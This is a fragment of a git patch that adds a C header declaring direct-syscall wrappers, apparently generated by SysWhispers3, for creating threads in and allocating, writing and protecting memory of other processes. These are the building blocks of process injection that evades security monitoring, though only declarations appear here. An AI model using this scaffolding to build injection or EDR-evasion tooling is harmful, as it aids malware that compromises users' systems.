++	ProcessImageFileName = 27,
++	ProcessBreakOnTermination = 29
++} PROCESSINFOCLASS, *PPROCESSINFOCLASS;
++
++EXTERN_C NTSTATUS Sw3NtCreateThreadEx(
++	OUT PHANDLE ThreadHandle,
++	IN ACCESS_MASK DesiredAccess,
++	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
++	IN HANDLE ProcessHandle,
++	IN PVOID StartRoutine,
++	IN PVOID Argument OPTIONAL,
++	IN ULONG CreateFlags,
++	IN SIZE_T ZeroBits,
++	IN SIZE_T StackSize,
++	IN SIZE_T MaximumStackSize,
++	IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL);
++
++EXTERN_C NTSTATUS Sw3NtAllocateVirtualMemory(
++	IN HANDLE ProcessHandle,
++	IN OUT PVOID * BaseAddress,
++	IN ULONG ZeroBits,
++	IN OUT PSIZE_T RegionSize,
++	IN ULONG AllocationType,
++	IN ULONG Protect);
++
++EXTERN_C NTSTATUS Sw3NtWriteVirtualMemory(
++	IN HANDLE ProcessHandle,
++	IN PVOID BaseAddress,
++	IN PVOID Buffer,
++	IN SIZE_T NumberOfBytesToWrite,
++	OUT PSIZE_T NumberOfBytesWritten OPTIONAL);
++
++EXTERN_C NTSTATUS Sw3NtProtectVirtualMemory(
++	IN HANDLE ProcessHandle,
++	IN OUT PVOID * BaseAddress,
++	IN OUT PSIZE_T RegionSize,
++	IN ULONG NewProtect,
++	OUT PULONG OldProtect);
++
++EXTERN_C NTSTATUS Sw3NtClose(
++	IN HANDLE Handle);
++
++EXTERN_C NTSTATUS Sw3NtQueryInformationProcess(
++	IN HANDLE ProcessHandle,
++	IN PROCESSINFOCLASS ProcessInformationClass,
++	OUT PVOID ProcessInformation,
++	IN ULONG ProcessInformationLength,
++	OUT PULONG ReturnLength OPTIONAL);
++
++#endif
+-- 
+2.39.5 (Apple Git-154)
+
